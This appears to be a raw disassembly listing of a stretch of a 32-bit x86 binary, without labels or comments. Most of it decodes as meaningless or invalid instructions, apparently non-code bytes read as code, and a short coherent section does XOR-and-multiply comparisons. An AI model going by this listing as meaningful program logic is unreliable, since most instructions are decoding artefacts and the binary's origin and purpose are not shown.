  40b2f3:	xor    al,0xc0
  40b2f5:	sbb    eax,esi
  40b2f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f8:	ds push ds
  40b2fa:	nop
  40b2fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2fc:	iret   
  40b2fd:	aas    
  40b2fe:	cmc    
  40b2ff:	inc    esp
  40b300:	dec    edx
  40b301:	pop    ebp
  40b302:	test   al,0xf0
  40b304:	sar    DWORD PTR [eax-0x4b],1
  40b307:	pop    esi
  40b308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b30a:	call   0x1961:0x1ed1e1fa
  40b311:	clc    
  40b312:	mov    al,ds:0x9c3019f6
  40b317:	or     eax,0xaf2f45cb
  40b31c:	fistp  WORD PTR [ecx+0x8]
  40b31f:	pop    eax
  40b320:	icebp  
  40b321:	add    BYTE PTR [eax-0x6dbdd645],ah
  40b327:	scas   eax,DWORD PTR es:[edi]
  40b328:	mov    al,bl
  40b32a:	add    BYTE PTR [edi],bh
  40b32c:	pop    ecx
  40b32d:	in     eax,0x63
  40b32f:	loope  0x40b315
  40b331:	adc    DWORD PTR ds:0x9985a78e,ecx
  40b337:	lea    ebp,[edi]
  40b339:	(bad)  
  40b33a:	jbe    0x40b2c8
  40b33c:	jg     0x40b32a
  40b33e:	inc    edx
  40b33f:	jp     0x40b324
  40b341:	push   esp
  40b342:	push   0x283597c3
  40b347:	mov    edx,0xd768ece3
  40b34c:	aaa    
  40b34d:	and    eax,0xb163918
  40b352:	retf   0x6af
  40b355:	pop    ebp
  40b356:	mov    esp,DWORD PTR [esi+esi*1-0x39]
  40b35a:	cmp    eax,DWORD PTR [ebp+0x5]
  40b35d:	or     ebx,DWORD PTR ds:0x9dded515
  40b363:	dec    ecx
  40b364:	push   esi
  40b365:	cmp    ah,BYTE PTR [edi]
  40b367:	pop    edx
  40b368:	xchg   BYTE PTR [ecx+0x24],ch
  40b36b:	or     bl,ch
  40b36d:	push   ecx
  40b36e:	push   ebx
  40b36f:	sbb    al,0xb1
  40b371:	in     eax,0x20
  40b373:	fs in  al,dx
  40b375:	popa   
  40b376:	adc    ebp,ebx
  40b378:	imul   ebx,DWORD PTR [ebx-0x37],0x2528029
  40b37f:	xlat   BYTE PTR ds:[ebx]
  40b380:	sbb    bl,BYTE PTR [edx]
  40b382:	mov    eax,DWORD PTR [ebp+0x2c]
  40b385:	hlt    
  40b386:	int3   
  40b387:	xlat   BYTE PTR ds:[ebx]
  40b388:	leave  
  40b389:	mov    edi,0xab3ef029
  40b38e:	(bad)
  40b392:	dec    ecx
  40b393:	fs dec eax
  40b395:	mov    WORD PTR ss:[di+0x0],es
  40b39a:	ja     0x40b38d
  40b39c:	mov    eax,0x4ce07b95
  40b3a1:	loop   0x40b35e
  40b3a3:	adc    eax,0x2c046a29
  40b3a8:	add    eax,0x98dfeac6
  40b3ad:	mov    eax,0x5a1c192d
  40b3b2:	xchg   ebx,eax
  40b3b3:	mov    al,ss:0xf0c3d195
  40b3b9:	fucomi st,st(3)
  40b3bb:	out    dx,eax
  40b3bc:	ja     0x40b375
  40b3be:	mov    WORD PTR [ebx+0x7e],ss
  40b3c1:	adc    eax,0x2d351e43
  40b3c6:	mov    ebx,esp
  40b3c8:	adc    cl,BYTE PTR [edi-0x3b]
  40b3cb:	dec    ebx
  40b3cc:	and    eax,0x7e8ad8d5
  40b3d1:	add    ch,dl
  40b3d3:	pop    ss
  40b3d4:	adc    eax,0xc046b1d4
  40b3d9:	xor    ebp,ebx
  40b3db:	test   BYTE PTR [esi+0x65],bl
  40b3de:	add    ah,bl
  40b3e0:	inc    ebp
  40b3e1:	jae    0x40b406
  40b3e3:	xor    BYTE PTR [ebp+0x4b],0x84
  40b3e7:	adc    eax,edi
  40b3e9:	xor    edx,DWORD PTR [ebp-0x4d]
  40b3ec:	shl    dl,cl
  40b3ee:	ins    DWORD PTR es:[edi],dx
  40b3ef:	jae    0x40b40b
  40b3f1:	xor    al,0xa3
  40b3f3:	stc    
  40b3f4:	clc    
  40b3f5:	inc    edx
  40b3f6:	xchg   ebx,eax
  40b3f7:	call   FWORD PTR [edx-0x2c26b4a3]
  40b3fd:	sub    BYTE PTR [edx-0x20d41db6],dh
  40b403:	cmp    ebx,edx
  40b405:	ja     0x40b82a
  40b40b:	mov    edx,DWORD PTR [ebp-0x2c]
  40b40e:	jmp    0x40bcba
  40b413:	jmp    0x40b82a
  40b418:	ror    DWORD PTR [edi-0x34],cl
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x2
  40b425:	mov    dl,0x61
  40b427:	adc    eax,ebp
  40b429:	xchg   BYTE PTR [esi+0x7e],bh
  40b42c:	jo     0x40b4a7
  40b42e:	jle    0x40b4ae
  40b430:	mov    WORD PTR [esi+edi*2-0x573f8b21],fs
  40b437:	xchg   DWORD PTR ds:0x357c1d6d,eax
  40b43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b43e:	ss (bad) 
  40b441:	and    BYTE PTR [edi],bl
  40b443:	jp     0x40b48d
  40b445:	lods   al,BYTE PTR ds:[esi]
  40b446:	ds pop ds
  40b448:	sbb    bh,BYTE PTR [ebp+0x3c3edcac]
  40b44e:	cdq    
  40b44f:	scas   eax,DWORD PTR es:[edi]
  40b450:	add    BYTE PTR [edi-0x2c],dl
  40b453:	imul   edx,DWORD PTR [eax+0x3edde518],0x4477d732
  40b45d:	div    BYTE PTR [ebx]
  40b45f:	int3   
  40b460:	nop
  40b461:	pop    edi
  40b462:	xor    eax,0xc352e473
  40b467:	dec    ebp
  40b468:	jmp    0xa77dab36
  40b46d:	push   0xbc87a8ed
  40b472:	push   edi
  40b473:	add    BYTE PTR [ecx],bh
  40b475:	retf   0x45d7
  40b478:	test   dh,0x51
  40b47b:	sbb    bl,0xa3
  40b47e:	dec    ebx
  40b47f:	aam    0xfd
  40b481:	push   ebp
  40b482:	dec    edi
  40b483:	mov    BYTE PTR [ecx-0x2bd8f5a8],bh
  40b489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b48a:	fwait
  40b48b:	(bad)  
  40b48c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40b48e:	imul   edi,DWORD PTR [edx+0x57],0xffffffd0
  40b492:	or     eax,0xddddc68a
  40b497:	out    dx,eax
  40b498:	jbe    0x40b4c7
  40b49a:	xchg   ebp,eax
  40b49b:	fiadd  WORD PTR [edi+0x20489f82]
  40b4a1:	adc    ebp,DWORD PTR [edx+ebx*1-0x30]
  40b4a5:	dec    ebp
  40b4a6:	pop    esi
  40b4a7:	xlat   BYTE PTR ds:[ebx]
  40b4a8:	mov    ebx,0xd81ca292
  40b4ad:	cdq    
  40b4ae:	sbb    eax,0x3ef56e33
  40b4b3:	enter  0x494,0xae
  40b4b7:	sub    DWORD PTR [edx+0x5ac75480],ecx
  40b4bd:	(bad)  
  40b4be:	fwait
  40b4bf:	gs xor cl,ch
  40b4c2:	std    
  40b4c3:	cmp    al,0x1d
  40b4c5:	sbb    al,0xae
  40b4c7:	cli    
  40b4c8:	pushf  
  40b4c9:	dec    ebx
  40b4ca:	in     eax,0xf2
  40b4cc:	cdq    
  40b4cd:	cld    
  40b4ce:	cmp    dh,BYTE PTR [edi]
  40b4d0:	or     al,0xd8
  40b4d2:	jmp    0x66da:0x2d90c41d
  40b4d9:	mov    eax,ds:0xb91b202f
  40b4de:	ds cdq 
  40b4e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4e1:	neg    ecx
  40b4e3:	cmp    DWORD PTR [esi],edi
  40b4e5:	jbe    0x40b53f
  40b4e7:	mov    esp,0x6cd65033
  40b4ec:	add    al,al
  40b4ee:	outs   dx,DWORD PTR ds:[esi]
  40b4ef:	mov    cl,0xed
  40b4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f3:	jnp    0x40b50b
  40b4f5:	cld    
  40b4f6:	and    DWORD PTR [edx+0x3e],esp
  40b4f9:	js     0x40b48a
  40b4fb:	pop    ecx
  40b4fc:	mov    ah,0x40
  40b4fe:	clc    
  40b4ff:	es inc edx
  40b501:	xor    al,0x4f
  40b503:	dec    edx
  40b504:	sub    cl,BYTE PTR [ebx-0x4d]
  40b507:	xor    DWORD PTR [ecx-0x7ef38aa5],ebp
  40b50d:	mov    ecx,0xbf7f7a7f
  40b512:	in     al,0xaa
  40b514:	scas   al,BYTE PTR es:[edi]
  40b515:	adc    al,0x5
  40b517:	imul   ecx,DWORD PTR [edx],0x26481b9e
  40b51d:	stos   DWORD PTR es:[edi],eax
  40b51e:	bound  edi,QWORD PTR [ebx+0x4e]
  40b521:	or     BYTE PTR [ebx-0x3698ce15],bh
  40b527:	pop    edx
  40b528:	(bad)  
  40b529:	jno    0x40b585
  40b52b:	pop    edi
  40b52c:	cmp    BYTE PTR [ebp+0x28],0x5e
  40b530:	push   cs
  40b531:	fst    QWORD PTR [eax]
  40b533:	mov    esi,0x1ea17b15
  40b538:	add    bh,BYTE PTR [ebx-0x34]
  40b53b:	test   BYTE PTR [eax+ebp*8],dl
  40b53e:	jne    0x40b519
  40b540:	pusha  
  40b541:	js     0x40b4f8
  40b543:	loopne 0x40b4ed
  40b545:	iret   
  40b546:	jmp    0x40b532
  40b548:	fadd   DWORD PTR [ebp+0x1e]
  40b54b:	repz rcl DWORD PTR [edi+0x9],cl
  40b54f:	add    al,0x25
  40b551:	enter  0x4afe,0x6b
  40b555:	adc    esi,edx
  40b557:	pop    ds
  40b558:	push   esi
  40b559:	and    DWORD PTR [eax],ebp
  40b55b:	jb     0x40b58f
  40b55d:	push   ecx
  40b55e:	add    esp,DWORD PTR [edx+0x5f6719c]
  40b564:	sub    eax,0x2fda470b
  40b569:	loop   0x40b551
  40b56b:	cmp    eax,0x3513fa28
  40b570:	call   0x4b04:0x63c480a5
  40b577:	mov    cl,bl
  40b579:	adc    eax,DWORD PTR [edx]
  40b57b:	push   ebp
  40b57c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b57d:	lock sub al,0x4b
  40b580:	retf   
  40b581:	shl    BYTE PTR [edx],1
  40b583:	pop    ebx
  40b584:	pop    esp
  40b585:	cmp    ebx,ecx
  40b587:	and    BYTE PTR [ebp+0x3b],dl
  40b58a:	stos   DWORD PTR es:[edi],eax
  40b58b:	sub    BYTE PTR [eax+0x7a327d67],cl
  40b591:	dec    ecx
  40b592:	(bad)  
  40b593:	js     0x40b52e
  40b595:	or     ecx,DWORD PTR [edx+0x46]
  40b598:	mov    dl,0x67
  40b59a:	mov    gs,edx
  40b59c:	sub    ah,BYTE PTR [ebp-0x67b795e2]
  40b5a2:	mov    ds:0x69c36f6a,eax
  40b5a7:	xor    edx,DWORD PTR [ecx+0x6aeb404f]
  40b5ad:	lods   al,BYTE PTR ds:[esi]
  40b5ae:	bound  ebx,QWORD PTR [edx]
  40b5b0:	mov    al,ds:0x321c86d3
  40b5b5:	pop    esp
  40b5b6:	sbb    dh,dh
  40b5b8:	sbb    BYTE PTR [eax-0x2df741fe],0x7b
  40b5bf:	jp     0x40b5b6
  40b5c1:	cwde   
  40b5c2:	fdivr  QWORD PTR [eax]
  40b5c4:	ja     0x40b5f7
  40b5c6:	(bad)  
  40b5c8:	scas   al,BYTE PTR es:[edi]
  40b5c9:	pop    es
  40b5ca:	and    DWORD PTR [esi-0x5],eax
  40b5cd:	fisubr WORD PTR [edi+0x12]
  40b5d0:	pushf  
  40b5d1:	dec    eax
  40b5d2:	adc    ebp,DWORD PTR [ecx]
  40b5d4:	push   edi
  40b5d5:	imul   ebp,edi,0xffffffa0
  40b5d8:	out    dx,al
  40b5d9:	sub    cl,BYTE PTR [edx]
  40b5db:	in     eax,0xdb
  40b5dd:	dec    esp
  40b5de:	imul   esi
  40b5e0:	outs   dx,DWORD PTR ds:[esi]
  40b5e1:	pop    eax
  40b5e2:	jns    0x40b5e2
  40b5e4:	jns    0x40b5be
  40b5e6:	mov    esp,0xda8b0f86
  40b5eb:	jge    0x40b62c
  40b5ed:	adc    ecx,DWORD PTR [edx+0xd]
  40b5f0:	out    dx,al
  40b5f1:	push   ss
  40b5f2:	mov    es,esi
  40b5f4:	addr16 je 0x40b580
  40b5f7:	int3   
  40b5f8:	inc    ebx
  40b5f9:	loopne 0x40b640
  40b5fb:	(bad)  
  40b5fc:	pop    ss
  40b5fd:	and    dh,ah
  40b5ff:	and    eax,0xf08a342f
  40b604:	mov    dl,BYTE PTR [ebx+0x4366e52a]
  40b60a:	in     al,0x73
  40b60c:	dec    edx
  40b60d:	je     0x40b675
  40b60f:	cmp    al,0x86
  40b611:	pop    ds
  40b612:	xchg   ecx,eax
  40b613:	rol    BYTE PTR [ebp-0x484891c9],1
  40b619:	xor    edx,eax
  40b61b:	out    0xaf,al
  40b61d:	jno    0x40b600
  40b61f:	sbb    al,dh
  40b621:	sbb    ecx,DWORD PTR [ebx-0x7ce64cc0]
  40b627:	and    al,0xe9
  40b629:	mov    al,ds:0x6f502f7e
  40b62e:	and    BYTE PTR [eax+0x2fe690ff],dh
  40b634:	scas   eax,DWORD PTR es:[edi]
  40b635:	arpl   WORD PTR ds:0x745dbcd1,di
  40b63b:	iret   
  40b63c:	dec    edx
  40b63d:	mov    esi,0xa1c17f79
  40b642:	or     dl,BYTE PTR [esi]
  40b644:	and    cl,BYTE PTR [edx+0xaf94464]
  40b64a:	xchg   ecx,eax
  40b64b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b64c:	mov    esi,0x4f43187
  40b651:	cmp    DWORD PTR [edx-0x6e],esi
  40b654:	cwde   
  40b655:	scas   eax,DWORD PTR es:[edi]
  40b656:	sbb    al,0x17
  40b658:	sbb    DWORD PTR [esi+0x7e],edi
  40b65b:	cmp    DWORD PTR [ecx+eax*4],esi
  40b65e:	inc    eax
  40b65f:	jnp    0x40b6a0
  40b661:	and    al,0xf6
  40b663:	or     al,0x72
  40b665:	mov    ds:0xaabd26e0,al
  40b66a:	jmp    0x40b656
  40b66c:	push   edx
  40b66d:	xchg   DWORD PTR [ebx],edx
  40b66f:	(bad)  
  40b671:	inc    esp
  40b672:	xor    BYTE PTR [edx],al
  40b674:	adc    BYTE PTR [ebp-0x162d50e4],bl
  40b67a:	hlt    
  40b67b:	loop   0x40b653
  40b67d:	shl    DWORD PTR [edx],cl
  40b67f:	adc    bl,BYTE PTR [ebp+0x2625cb5d]
  40b685:	xchg   edx,eax
  40b686:	mov    al,0x1d
  40b688:	shr    DWORD PTR [ebx+eiz*1+0x736a0af0],0x66
  40b690:	les    eax,FWORD PTR [edx]
  40b692:	cmp    ax,0x3f7b
  40b696:	cmp    eax,0x6f093672
  40b69b:	xchg   edi,eax
  40b69c:	adc    bh,dl
  40b69e:	xor    eax,0xaf24e679
  40b6a3:	rcr    esp,cl
  40b6a5:	mov    esi,0xfa1d648a
  40b6aa:	stc    
  40b6ab:	jp     0x40b6f7
  40b6ad:	push   ds
  40b6ae:	ret    
  40b6af:	and    al,BYTE PTR [eax-0x6b875b54]
  40b6b5:	xor    esi,DWORD PTR [ebx-0x4fd42187]
  40b6bb:	rcl    ebp,cl
  40b6bd:	mov    al,ds:0x9cee7b39
  40b6c2:	mov    WORD PTR [eax+0x1e654c53],ss
  40b6c8:	es ins BYTE PTR es:[edi],dx
  40b6ca:	popa   
  40b6cb:	iret   
  40b6cc:	mov    DWORD PTR [edx],eax
  40b6ce:	pop    esi
  40b6cf:	mov    bh,0xe0
  40b6d1:	sub    al,0x95
  40b6d3:	adc    al,BYTE PTR [edx-0x1b]
  40b6d6:	call   0xa814:0xe8805aa7
  40b6dd:	adc    DWORD PTR [ecx],eax
  40b6df:	jbe    0x40b727
  40b6e1:	and    BYTE PTR [ecx-0x7276c725],bh
  40b6e7:	mov    eax,ds:0x99adac38
  40b6ec:	ret    0x5b98
  40b6ef:	mul    BYTE PTR [edi+0x517514a9]
  40b6f5:	(bad)  
  40b6f6:	mov    bh,0x6b
  40b6f8:	push   edx
  40b6f9:	and    BYTE PTR [ecx-0x1f],bl
  40b6fc:	or     dh,BYTE PTR ds:0xa365934e
  40b702:	mov    bh,ch
  40b704:	sar    dl,cl
  40b706:	jecxz  0x40b68c
  40b708:	mov    edi,DWORD PTR [ebx+0xe15d100]
  40b70e:	fbstp  TBYTE PTR [ebp-0x59]
  40b711:	ins    BYTE PTR es:[edi],dx
  40b712:	in     eax,0x1a
  40b714:	fcomi  st,st(1)
  40b716:	mov    ch,0x32
  40b718:	jmp    0x40b6b4
  40b71a:	and    ch,cl
  40b71c:	mov    WORD PTR [eax],ds
  40b71e:	shl    dh,0x5c
  40b721:	xlat   BYTE PTR ds:[ebx]
  40b722:	mov    edi,0xddb0619e
  40b727:	mov    cl,0xba
  40b729:	rcr    BYTE PTR [ebp-0x66],cl
  40b72c:	push   edi
  40b72d:	or     al,BYTE PTR ds:0xad61f1ff
  40b733:	mov    ss,ecx
  40b735:	xor    ebp,DWORD PTR [ecx-0x44]
  40b738:	mov    esi,0x106c07c9
  40b73d:	mov    dh,0x0
  40b73f:	retf   0x366f
  40b742:	pop    ebx
  40b743:	in     al,dx
  40b744:	xchg   ebp,eax
  40b745:	mov    ebp,0xc6e6c980
  40b74a:	dec    edx
  40b74b:	vhsubps ymm2,ymm2,YMMWORD PTR [ebp+0x33b1d1bc]
  40b753:	shl    eax,cl
  40b755:	cmp    cl,bl
  40b757:	aad    0x5d
  40b759:	jns    0x40b6df
  40b75b:	cdq    
  40b75c:	jecxz  0x40b705
  40b75e:	int3   
  40b75f:	mov    ?,WORD PTR [ecx+0x57ffd3f3]
  40b765:	not    ch
  40b767:	(bad)  
  40b768:	bound  ecx,QWORD PTR [ecx+0xe]
  40b76b:	add    DWORD PTR [eax],esi
  40b76d:	cmp    BYTE PTR [esi+0x1b424c7b],al
  40b773:	fisubr WORD PTR [edi]
  40b775:	loope  0x40b710
  40b777:	retf   0x14df
  40b77a:	jp     0x40b7de
  40b77c:	pop    ebx
  40b77d:	ja     0x40b7c2
  40b77f:	add    cl,ch
  40b781:	sub    DWORD PTR [ebp-0x6d],0xffffff9e
  40b785:	ins    BYTE PTR es:[edi],dx
  40b786:	pop    edi
  40b787:	add    BYTE PTR [esi-0x27],0xdb
  40b78b:	and    ebx,DWORD PTR [edx+ebx*4]
  40b78e:	xchg   ebx,eax
  40b78f:	or     BYTE PTR [edx],0x98
  40b792:	sar    dh,0xb
  40b795:	rol    eax,cl
  40b797:	dec    esi
  40b798:	sub    BYTE PTR [ecx-0x76],ch
  40b79b:	sbb    ebx,edx
  40b79d:	xlat   BYTE PTR ds:[ebx]
  40b79e:	(bad)  
  40b79f:	repnz in al,0x3d
  40b7a2:	or     edx,DWORD PTR [edi]
  40b7a4:	std    
  40b7a5:	sahf   
  40b7a6:	jecxz  0x40b793
  40b7a8:	cli    
  40b7a9:	cmp    edi,DWORD PTR [ebp+0x35e1cac0]
  40b7af:	sahf   
  40b7b0:	lods   al,BYTE PTR ds:[esi]
  40b7b1:	push   ebp
  40b7b2:	push   ecx
  40b7b3:	push   ebx
  40b7b4:	adc    esp,0x1f9a8b10
  40b7ba:	push   edi
  40b7bb:	and    al,0x32
  40b7bd:	imul   edx,DWORD PTR [eax-0x7f],0xffffffca
  40b7c1:	inc    ecx
  40b7c2:	mov    eax,DWORD PTR [ecx+0xe]
  40b7c5:	push   ebx
  40b7c6:	test   DWORD PTR [edx],ecx
  40b7c8:	iret   
  40b7c9:	xchg   esp,edi
  40b7cb:	outs   dx,DWORD PTR ds:[esi]
  40b7cc:	mov    dl,0xf7
  40b7ce:	ds ds dec eax
  40b7d1:	mov    ds,WORD PTR [esi+0x37]
  40b7d4:	xor    bl,BYTE PTR [eax-0x3d]
  40b7d7:	xchg   edx,eax
  40b7d8:	sub    eax,0x4303096d
  40b7dd:	dec    esi
  40b7de:	jb     0x40b820
  40b7e0:	mov    dh,0x33
  40b7e2:	push   ecx
  40b7e3:	push   edi
  40b7e4:	mov    DWORD PTR [ebp+0x66],esp
  40b7e7:	sub    DWORD PTR [edx+0x295a477f],ecx
  40b7ed:	mov    ah,0x8b
  40b7ef:	pop    ds
  40b7f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7f1:	sub    ah,BYTE PTR [esi]
  40b7f3:	pop    ss
  40b7f4:	xor    edx,DWORD PTR [ebx+0x68]
  40b7f7:	lods   al,BYTE PTR ds:[esi]
  40b7f8:	xor    al,0x4a
  40b7fa:	(bad)  
  40b7fb:	mov    ebp,0xfc85949b
  40b800:	xor    al,0xd0
  40b802:	cmp    BYTE PTR [esi-0x56],bl
  40b805:	xchg   edx,eax
  40b806:	add    al,ch
  40b808:	or     ah,BYTE PTR [edi+esi*2+0x73]
  40b80c:	mov    ds,WORD PTR [esi]
  40b80e:	jns    0x40b811
  40b810:	dec    edx
  40b811:	popa   
  40b812:	dec    eax
  40b813:	mov    ah,0xf
  40b815:	gs test eax,0xb03cf5d9
  40b81b:	lea    esp,[esi]
  40b81d:	addr16 add eax,0xf1f1a804
  40b823:	xchg   esi,eax
  40b824:	out    dx,eax
  40b825:	fcmovnbe st,st(1)
  40b827:	mov    ?,edi
  40b829:	pushf  
  40b82a:	mov    edx,DWORD PTR [ebp-0x34]
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	jge    0x40b852
  40b8a6:	xchg   edi,eax
  40b8a7:	ja     0x40b88b
  40b8a9:	cmp    BYTE PTR [esi+0x7e],0x70
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b88e
  40b8b1:	jmp    DWORD PTR [edx+0x48]
  40b8b4:	ficomp DWORD PTR [ebx-0x2]
  40b8b7:	xchg   edx,eax
  40b8b8:	sub    ebp,ebp
  40b8ba:	jne    0x40b87f
  40b8bc:	adc    cl,BYTE PTR [ebx+0x14]
  40b8bf:	lods   eax,DWORD PTR ds:[esi]
  40b8c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8c1:	mov    ch,0x3f
  40b8c3:	into   
  40b8c4:	cs pop eax
  40b8c6:	xchg   edi,eax
  40b8c7:	enter  0x1b46,0xd3
  40b8cb:	pop    es
  40b8cc:	mov    ?,WORD PTR [ebx-0x5e]
  40b8cf:	sbb    al,0xf6
  40b8d1:	ja     0x40b897
  40b8d3:	cli    
  40b8d4:	into   
  40b8d5:	xor    eax,DWORD PTR [edi+eax*2+0x16756396]
  40b8dc:	pop    eax
  40b8dd:	sub    al,0x13
  40b8df:	pushf  
  40b8e0:	lods   al,BYTE PTR fs:[esi]
  40b8e2:	in     eax,0xb5
  40b8e4:	int    0x56
  40b8e6:	test   al,0x27
  40b8e8:	dec    edi
  40b8e9:	jecxz  0x40b8e4
  40b8eb:	(bad)  
  40b8ec:	pop    ds
  40b8ed:	sbb    ch,BYTE PTR [edx]
  40b8ef:	sti    
  40b8f0:	inc    esp
  40b8f1:	pop    edi
  40b8f2:	gs test eax,0x75ce8a18
  40b8f8:	je     0x40b93b
  40b8fa:	cld    
  40b8fb:	loopne 0x40b961
  40b8fd:	adc    al,0x40
  40b8ff:	or     al,BYTE PTR [esi-0x32cafafa]
  40b905:	pop    edx
  40b906:	cwde   
  40b907:	div    DWORD PTR [esp+eiz*2]
  40b90a:	or     al,0xbf
  40b90c:	(bad)  
  40b90d:	pop    ss
  40b90e:	dec    ebx
  40b90f:	pop    ss
  40b910:	xor    bl,BYTE PTR [edi]
  40b912:	lods   al,BYTE PTR ds:[esi]
  40b913:	(bad)  
  40b914:	mov    ch,0x24
  40b916:	adc    BYTE PTR [ebp+0x23],ah
  40b919:	mov    al,ds:0x5fb9f8bd
  40b91e:	test   eax,0xc58cb9bf
  40b923:	xchg   DWORD PTR [esi+edx*1],esi
  40b926:	add    bl,dl
  40b928:	dec    BYTE PTR [eax+0xd]
  40b92b:	imul   ebx,DWORD PTR [edi+0x3166ac03],0x33
  40b932:	sahf   
  40b933:	xor    BYTE PTR [edx+0x2730b2b7],0xff
  40b93a:	fstp   DWORD PTR [edi+0x581a2f68]
  40b940:	mov    al,ds:0x96ec90db
  40b945:	xor    ah,al
  40b947:	mov    ecx,0x316d87b8
  40b94c:	sar    DWORD PTR [edx-0x16ca4c0d],cl
  40b952:	push   ebp
  40b953:	pop    ds
  40b954:	iret   
  40b955:	dec    edi
  40b956:	fiadd  DWORD PTR [edx-0x402f89b]
  40b95c:	or     edx,DWORD PTR [esi-0x2f]
  40b95f:	lods   eax,DWORD PTR ds:[esi]
  40b960:	jmp    FWORD PTR [esi]
  40b962:	stos   BYTE PTR es:[edi],al
  40b963:	adc    bl,ah
  40b965:	in     al,dx
  40b966:	xchg   BYTE PTR [edi+0x12f4673b],ah
  40b96c:	xor    eax,0x39bbd956
  40b971:	aad    0xb9
  40b973:	cwde   
  40b974:	cmpps  xmm2,XMMWORD PTR [ecx],0xe1
  40b978:	idiv   DWORD PTR [ebx]
  40b97a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b97b:	inc    eax
  40b97c:	inc    ebx
  40b97d:	lea    ecx,[ebx]
  40b97f:	aaa    
  40b980:	push   ebx
  40b981:	inc    eax
  40b982:	(bad)  
  40b984:	jecxz  0x40b9b5
  40b986:	mov    edi,0x8adb34a6
  40b98b:	xor    al,0xea
  40b98d:	jp     0x40b924
  40b98f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b990:	inc    edi
  40b991:	sub    DWORD PTR [edi],ecx
  40b993:	push   0x529cd2e2
  40b998:	retf   0xc27e
  40b99b:	xchg   ecx,eax
  40b99c:	jnp    0x40b9bb
  40b99e:	lds    ebp,FWORD PTR [ebx-0x270c4a51]
  40b9a4:	(bad)  
  40b9a6:	add    edi,DWORD PTR [eax-0x5f06c61b]
  40b9ac:	sub    eax,0x8c22ee57
  40b9b1:	jo     0x40b9a2
  40b9b3:	sahf   
  40b9b4:	das    
  40b9b5:	or     BYTE PTR [ebx-0x7e],cl
  40b9b8:	jns    0x40b9e2
  40b9ba:	clc    
  40b9bb:	(bad)  
  40b9bc:	xchg   esp,eax
  40b9bd:	pop    ds
  40b9be:	xchg   BYTE PTR [edx+edx*4+0x5d6b0f49],al
  40b9c5:	cdq    
  40b9c6:	inc    esi
  40b9c7:	push   edx
  40b9c8:	push   ss
  40b9c9:	sub    BYTE PTR [edi],ch
  40b9cb:	mov    BYTE PTR [esi-0x10],ch
  40b9ce:	loop   0x40ba38
  40b9d0:	mov    ch,0xd8
  40b9d2:	xchg   ebp,eax
  40b9d3:	sahf   
  40b9d4:	mov    eax,0x5dd897d7
  40b9d9:	stos   BYTE PTR es:[edi],al
  40b9da:	or     edi,DWORD PTR [ecx+edi*2]
  40b9dd:	push   esi
  40b9de:	sbb    al,0x3c
  40b9e0:	cmovge ebp,DWORD PTR [eax]
  40b9e3:	adc    al,0x25
  40b9e5:	sbb    eax,edi
  40b9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e8:	mov    cl,0x48
  40b9ea:	icebp  
  40b9eb:	push   DWORD PTR [ecx-0x4cb9d673]
  40b9f1:	(bad)  
  40b9f2:	out    dx,eax
  40b9f3:	repnz sti 
  40b9f5:	mov    ebx,0x3808612a
  40b9fa:	add    cl,BYTE PTR [edi+edx*1+0x42]
  40b9fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ff:	mov    al,ds:0xfb676e7
  40ba04:	test   al,0xb1
  40ba06:	xchg   BYTE PTR [ebx+esi*4-0x11],cl
  40ba0a:	dec    esp
  40ba0b:	push   0x49bc8395
  40ba10:	cwde   
  40ba11:	mov    bl,0xc
  40ba13:	sub    al,0x33
  40ba15:	pop    ss
  40ba16:	bound  esp,QWORD PTR [ecx]
